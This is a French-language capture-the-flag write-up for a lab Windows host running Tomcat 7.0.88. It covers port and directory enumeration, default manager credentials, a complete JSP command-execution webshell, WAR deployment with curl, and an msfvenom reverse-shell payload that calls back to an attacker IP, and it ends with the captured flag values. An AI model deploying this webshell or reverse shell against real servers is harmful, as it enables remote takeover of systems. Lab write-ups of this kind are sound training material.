
# Target : 10.129.136.9

# Enumeration des ports et Services sur la machine

```js
nmap -sV -sC -Pn 10.129.136.9 -A -O
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 23:45 +0000
Nmap scan report for 10.129.136.9
Host is up (0.59s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   802.99 ms 10.10.14.1
2   803.27 ms 10.129.136.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.65 seconds
```

## Trouvaille 

```js
http port : 8080
Version : Apache Tomcat/Coyote JSP engine 1.1
HTTP Title : Tomcat/7.0.88
OS : Microsoft Windows Server 2012 R2
```

# http Enumeration

![](/assets/IMG-20260716001603225.png)


## Directory Listing

```js
feroxbuster -u "http://10.129.136.9:8080" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x .txt,.html,.bak,.env,.php,.xmlc -k
```

```js
401      GET       63l      289w     2536c http://10.129.136.9:8080/manager/status

```

### Trouvaille des creds dans le ficher d'erreur de connection de la page
![](/assets/IMG-20260716011728763.png)

```js
user : tomcat
pass : s3cret
```

# Connection a la page admin

![](/assets/IMG-20260716002533402.png)

# Creation de payload pour la RCE
## PoC
```js
https://hackviser.com/tactics/pentesting/services/tomcat#war-file-upload-manager-access
```

```js
# Create JSP webshell
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
EOF

# Package as WAR
mkdir -p WEB-INF
jar -cvf shell.war shell.jsp WEB-INF

# Deploy using curl
curl -u 'admin:password' \
  --upload-file shell.war \
  "http://10.129.136.9:8080/manager/text/deploy?path=/shell&update=true"

# Access webshell
curl "http://10.129.136.9:8080/shell/shell.jsp?cmd=whoami"

# Using Metasploit
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.101 LPORT=4444 -f war > shell.war
curl -u 'tomcat:s3cret' --upload-file shell.war "http://10.129.136.9:8080/manager/text/deploy?path=/shell"
```

![](/assets/IMG-20260716013804006.png)

![](/assets/IMG-20260716015446636.png)
# Flag1 : 7004dbcef0f854e0fb401875f26ebd00

# Flag2 : 04a8b36e1545a455393d067e772fe90e